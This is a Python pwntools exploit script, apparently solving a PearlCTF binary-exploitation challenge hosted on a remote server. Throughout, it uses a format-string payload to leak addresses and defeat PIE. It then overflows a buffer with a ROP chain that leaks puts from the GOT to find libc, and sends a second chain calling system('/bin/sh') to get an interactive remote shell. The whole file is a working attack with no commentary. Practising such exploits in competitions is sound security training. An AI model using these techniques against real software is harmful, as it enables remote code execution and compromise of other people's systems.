from pwn import *

elf = ELF('./chall')
libc = ELF('./libc.so.6')
# io = process(elf.path)
io = remote('mr---ropot.ctf.pearlctf.in', 30009)
context.binary = elf

call_printFact_offset = 153
ret_addr = 0x101a
pop_rdi_addr = 0x122e

io.recv()
io.sendline(b'2')
io.recv()

payload = b'%p-' * 11
payload += b'%p!%p'
io.sendline(payload)
io.recvuntil(b'!')
main_call_printFact_addr = int(io.recvline().strip(), 16)
main_addr = main_call_printFact_addr - call_printFact_offset
elf.address = main_addr - elf.symbols['main']

log.info(f'main address: {hex(main_addr)}')
log.info(f'ret address: {hex(elf.address + ret_addr)}')

io.recv()
io.sendline(b'2')
payload = b'a' * 56
payload += p64(elf.address + pop_rdi_addr)
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])
payload += p64(elf.sym['main'])
io.sendlineafter(b'Did you like the fact? Leave a response: ', payload)
io.recvuntil(b'has')
io.recvline()
puts_addr = u64(io.recvline().strip().ljust(8, b'\x00'))
log.info(f'puts address: {hex(puts_addr)}')

libc.address = puts_addr - libc.symbols['puts']
log.info(f'libc base address: {hex(libc.address)}')
payload = b'a' * 56
rop = ROP(libc)
rop.raw(elf.address + ret_addr)
rop.system(next(libc.search(b'/bin/sh')))
payload += rop.chain()
io.recv()
io.sendline(b'2')
io.sendlineafter(b'Did you like the fact? Leave a response: ', payload)

io.interactive()

